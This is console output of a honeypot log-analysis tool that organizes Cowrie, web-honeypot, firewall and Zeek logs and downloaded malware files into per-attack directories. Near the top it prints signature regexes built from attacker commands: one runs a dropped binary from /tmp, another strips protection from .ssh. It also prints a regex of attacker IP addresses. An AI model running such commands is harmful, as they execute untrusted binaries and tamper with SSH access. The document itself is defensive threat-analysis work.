Regex merged 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 into 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c on commands: re.compile('cd /tmp && chmod \+x [\w\d]+ && bash -c ./[\w\d]+')
Regex merged b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f into 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c on commands: re.compile('cd /tmp && chmod \+x [\w\d]+ && bash -c ./[\w\d]+')
Regex merged c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 into a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 on commands: re.compile('cd ~; chattr -ia .ssh; lockr -ia .ssh')
(48->43) - Merged 5 attacks with shared sig regexes
Skipping attack a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 with 209 IPs (max_ips_per_attack=10)
Skipping attack 5cf1c21aa6e8cbade37863a4773c61613f17cc41f7b6b9a00956c09270becf75 with 40 IPs (max_ips_per_attack=10)
Skipping attack ffd79baff1ac4708922e81990f239012311844465b35189b44c0fddb074c2a70 with 33 IPs (max_ips_per_attack=10)
Skipping attack 85eb37329ba115f18c3f60c8d979b23f56a9bb38b35e5cf19d544e12b5b2bbc8 with 17 IPs (max_ips_per_attack=10)
Organizing attacks into attack directories at /Users/lucasfaudman/Documents/SANS/testenv/attacks
Prepared regex pattern: b'(35\.85\.244\.164|35\.85\.237\.231|44\.229\.31\.222|44\.233\.198\.138|54\.187\.66\.79|3\.238\.240\.225|194\.67\.201\.41|54\.222\.143\.33|52\.80\.229\.231|52\.81\.27\.255|59\.4\.55\.180|103\.130\.189\.246|113\.111\.174\.87|182\.31\.217\.18|150\.158\.27\.38|103\.163\.215\.12|164\.90\.163\.107|49\.234\.50\.52|44\.207\.239\.204|128\.199\.218\.182|66\.240\.205\.34|104\.237\.135\.225|192\.155\.86\.241|23\.92\.24\.103|72\.14\.181\.67|117\.190\.226\.115|222\.111\.179\.159|31\.208\.22\.102|73\.43\.215\.50|18\.138\.212\.58|18\.116\.202\.221|13\.250\.8\.18|185\.180\.143\.49|45\.156\.129\.2|185\.180\.143\.141|164\.92\.192\.25|134\.122\.89\.242|138\.68\.163\.10|68\.69\.186\.30|45\.142\.182\.77|91\.92\.243\.232|93\.223\.169\.159|27\.93\.25\.111|111\.216\.194\.148|172\.104\.228\.72|93\.123\.85\.82|91\.92\.243\.65|202\.90\.136\.204|149\.127\.191\.44|91\.92\.249\.164|94\.156\.65\.188|192\.227\.146\.253|123\.99\.201\.37|221\.160\.138\.230|112\.168\.208\.76|41\.160\.238\.201|218\.145\.61\.20|188\.166\.224\.136|91\.92\.243\.167|185\.224\.128\.191|185\.180\.143\.80|23\.20\.205\.139|43\.135\.123\.64|43\.132\.196\.160|20\.197\.51\.98|103\.121\.39\.54|75\.119\.144\.68|208\.65\.84\.32|120\.63\.180\.123|64\.23\.130\.198|102\.37\.103\.237|45\.95\.147\.236|47\.120\.37\.43|3\.93\.0\.214|103\.85\.95\.36|95\.214\.53\.103|193\.32\.162\.174|172\.98\.33\.206|188\.166\.174\.44|178\.72\.69\.244)'
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/7ea3ab134f5340790a7a9d64915c9aa8418f3c9707cff0ab76b2ce4e33da9656/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/28ba533b0f3c4df63d6b4a5ead73860697bdf735bb353e4ca928474889eb8a15/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/7ab552f01de999cb12092166cdc36fd68a0edbb33927e0ef3d26f4ee6449f804/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/1bd476ad78c1f8fd54963653f838e608ef25d8a0a9e84a54fcd1b3889ada6fae/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/1ae2a0aa7da872071305a1170015dfebfd7e40ebb8cb16a15979522836b53687/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/0ad0d02f9c317f120457c60054218fe8e53c3ed63546ef9681986d143a49a518/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/2052f501395004cd5eadfe6b8e9fba9d0be7b1c31f9864e9eb68d3490a5d3c55/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/51e82af9c7a10e0c74d49799d1344fd73a08d95cee17a9b7ed1644e981905f13/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/6536b48b9a0b55e0ce90043b2eb5bba229ac18ef6100a8b7f474318db4e11db1/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/0c5e35708d1ddce35bd8d2c3ec1a04a2ecaa2ec203071d00591afa6f24f01f98/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/eafdc691c2945a067fa5de7bac393326241395a9cd11bc6737c7191859f13b80/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/6ef6eba782945c5c6d677a2ea8e1fc8320bfae6eb3800f5e7888c3b266479f00/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/846f2a6c936a5c60bf416fa277a315d852da3ed0f52d2c9e22aca882ad3e17d2/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/a55636347c67b3744e5bd21dede42f7de1db694a586d10ef47a9eb8d23d275f9/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/28d2ac3befde61d0e429298eab1a7938c81935678d9169e177a674f741ca7c2e/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/50758fb09c87e81299ba39f366474396f6eb9a82068707505780307a7021ccd2/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/7da13397216e915d3648622960fa18ea26295ad5f180cf1346511991dc689ea9/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/ffc86c13c2614123fced454ae877687ceae7759a81df85d61960f7c2079faf59/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/4da3ee2625bb069ebb113ec1ce45b4f5b8ec39e3e743330b94f6c15e4c25f84a/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/ed38805b5dd55c277dcbebb9c4db218b036f9cae287ba106cc774ec3da18bfcf/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/79cee4cdd57b016e9a6cdc9b23385b110da33ec808b64670bcf45b0661db1a65/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/0b60b47c6cbbec8f0c44289158db12490185b6ef821e8b1946a745c8b300ac67/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/f9a22a65178153d25e6a84189570709a0aced94197404093eff5cea464b865ac/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/a23e9121e296bd9ba20a37c2cc6f2fab5285e2f6efd635841d835724544d6758/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/6fa4c8ac58e7a1d947dc3250c39d1e27958f012e68061d8de0a7b70e3a65b906/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/249a049e611f83823c514eb7b904977ae94371768ea3a93160378a9f757827cc/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/bc816b9b031183662a273fbc558312d1b2950f19a0d2d91345474a152011f6bf/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/3c9d7241372c627d30ffb3a9868fbf4c4fc2ec4b0c4e0ac7909ddfcefc6bcaf9/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/30d72557f4e8b64fba88e86ce784ac08339fca517863f30d194830c90ff72a01/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/c4927e4103e250b181e76582991f71a7a3987ccae02ad1fc8cff377e65871199/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/3b6819f4180302fda913f82fcc8c8b4de5370e7d761872207a5dbf0cc2f750f7/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/d9e9714edf4333cdaeeaa837d3542451931a587a47d48afce527cfc81ea8e144/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/2b5bfc8daca85f59084e942c25bd635e6519a07f1e2847fd8c6af18038c608a6/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/f9c78e80544b19ef2c5ee00ca276136cbfdd61d5ae8cfbd904e1b5adbd66830d/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/a66a6d7f44765043006458e840366d2331e12ec7361c05f002dfab81a9e95060/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/63a01ec266fce76ebdb77cc72df4d2adde52f742d7f02204eb0a302b71378a88/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/801f77ad815592be4a10b2c6b624d2f93117eb141fb2fc3cef008cce6c496ade/auth_random.json
Done preparing dirs for 39 attacks
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/auth_random.json
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/auth_random.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-02-01.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-31.json
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-31.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-27.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-26.json
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-02-01.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-30.json
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-30.json
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-27.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-29.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-26.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-28.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-29.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-25.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-31.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-25.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-30.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-31.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-30.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-26.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-27.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-29.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-25.json
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-26.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-28.json
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-27.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-25.json
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-29.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-02-01.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-21.json
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-21.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-20.json
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-28.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-27.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-02-01.json
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-02-01.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-26.json
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-02-01.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-27.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-30.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-25.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-29.json
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-25.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-28.json
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/cowrie/cowrie.2024-01-28.json
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-28.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-02-02.json
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-26.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-24.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-23.json
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-23.json
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-24.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-22.json
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-02-02.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/039a100a9ad6ad1ccaea5bc0c5ee9330db53e007fee36a3751eec7c7f940ab7c
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/039a100a9ad6ad1ccaea5bc0c5ee9330db53e007fee36a3751eec7c7f940ab7c
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/abb79b34f4b0b92da15a86c1fc7533dd17cfffca362e53ddae98cf978b10d1cd
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/abb79b34f4b0b92da15a86c1fc7533dd17cfffca362e53ddae98cf978b10d1cd
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/bfa3daae0db8579a2332dd22473aa9b7aa9b75a08a2e53b04b0768f2703274d2
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/bfa3daae0db8579a2332dd22473aa9b7aa9b75a08a2e53b04b0768f2703274d2
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-22.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/d6528bab8c5559c68312285c0c214744f0f33ba93a51942bcc6d9d2770476e26
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/d6528bab8c5559c68312285c0c214744f0f33ba93a51942bcc6d9d2770476e26
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/f03b5186bfc5f66608e1505f2a7f386900f54ebb810d7e8f3ac644bcb811bbed
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/f03b5186bfc5f66608e1505f2a7f386900f54ebb810d7e8f3ac644bcb811bbed
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/8f622cb686dac3f447759408abbcdcdfe89bf5e9c56467d96c6435588db6664f
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/8f622cb686dac3f447759408abbcdcdfe89bf5e9c56467d96c6435588db6664f
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/52d0c6f738ad1186407dc9c1ec588fcb65a4295473b660b355dbe96c24585bdb
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/52d0c6f738ad1186407dc9c1ec588fcb65a4295473b660b355dbe96c24585bdb
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/5fe60489106356ad6c84be890291de2514f25219379e586474c51cd163161aff
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/5fe60489106356ad6c84be890291de2514f25219379e586474c51cd163161aff
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/ef326a197652e77cbe4b9b5bfa8f276d77d3dbd13b25b6b094589b9a504c151b
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/ef326a197652e77cbe4b9b5bfa8f276d77d3dbd13b25b6b094589b9a504c151b
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/5ce92942d34bc35cbe3fb8759b810481b11ff43b070b6e67c124d88a83c93176
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/5ce92942d34bc35cbe3fb8759b810481b11ff43b070b6e67c124d88a83c93176
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/a63b0fd571a077734a68f5955bf91986c5f39af23f1d4552e02662aa9bac0458
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/a63b0fd571a077734a68f5955bf91986c5f39af23f1d4552e02662aa9bac0458
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/90798b61d7dce18429335cd149b9b271e71fe121b11dcefca34f19a3839fb37c
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/90798b61d7dce18429335cd149b9b271e71fe121b11dcefca34f19a3839fb37c
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/e63969f07eb117998329f37cb3543d83c76c1260d6122120ec7b7d256676b022
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/e63969f07eb117998329f37cb3543d83c76c1260d6122120ec7b7d256676b022
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/8a57f997513e762dec5cd58a2de822cdf3d2c7ef6372da6c5be01311e96e8358
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/8a57f997513e762dec5cd58a2de822cdf3d2c7ef6372da6c5be01311e96e8358
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/ae62fd6ad97b9833d48963333839235f5fd7b66bd0b55665cadaf5888327eca8
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/ae62fd6ad97b9833d48963333839235f5fd7b66bd0b55665cadaf5888327eca8
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/2a709210900cd1a8c658030b19dd832bfb271dee8956cf93c43314b3dc8175e1
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/2a709210900cd1a8c658030b19dd832bfb271dee8956cf93c43314b3dc8175e1
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/713ca6a961a02c78b95decc18a01c69606d112c77ffc9f8629eb03ac39e7a22b
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/713ca6a961a02c78b95decc18a01c69606d112c77ffc9f8629eb03ac39e7a22b
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/c090ae197a6cd91ba529374e99972b78cda533f4ee94a292446ca88498ed453a
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/c090ae197a6cd91ba529374e99972b78cda533f4ee94a292446ca88498ed453a
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/b1b8308d882329d9d10fed76e51cbdcba10a899abeeda81cda4764f61a4804d1
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/b1b8308d882329d9d10fed76e51cbdcba10a899abeeda81cda4764f61a4804d1
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/71bb33abdf1a20737d74965af744075c27e8b5db1c6887d903fd6e029d39313f
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/71bb33abdf1a20737d74965af744075c27e8b5db1c6887d903fd6e029d39313f
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/275776445b4225c06861b2f6f4e2ccf98e3f919583bddb9965d8cf3d4f6aa18f
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/275776445b4225c06861b2f6f4e2ccf98e3f919583bddb9965d8cf3d4f6aa18f
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/9972b39bdad6e973490f4988693e0d730a93a4c4968fb542bdd3b28b8393a8a4
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/9972b39bdad6e973490f4988693e0d730a93a4c4968fb542bdd3b28b8393a8a4
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/2d4af503d71c8d5ebedb020adea78e35bc37c5456dd15611f5e98c90cbb3d095
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/2d4af503d71c8d5ebedb020adea78e35bc37c5456dd15611f5e98c90cbb3d095
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/malware/downloads/199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/firewall/dshield.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/loaded_scripts.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/dhcp.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/loaded_scripts.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/dhcp.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/notice.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/reporter.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/reporter.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/x509.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/x509.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/software.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-30.json
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/software.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/conn.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/snmp.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/snmp.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/stats.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/known_services.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/known_services.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/stats.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/capture_loss.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/capture_loss.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/ssl.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/ssh.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/firewall/dshield.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/sip.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/sip.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/files.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/analyzer.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/ssl.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/notice.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/radius.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/radius.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/tunnel.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/tunnel.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/analyzer.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/dpd.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/dpd.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/http.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/ntp.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/telemetry.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/packet_filter.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/packet_filter.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/weird.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-20.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/dns.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/weird.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/kerberos.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/kerberos.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/telemetry.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/known_hosts.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/known_hosts.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/files.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/http.log
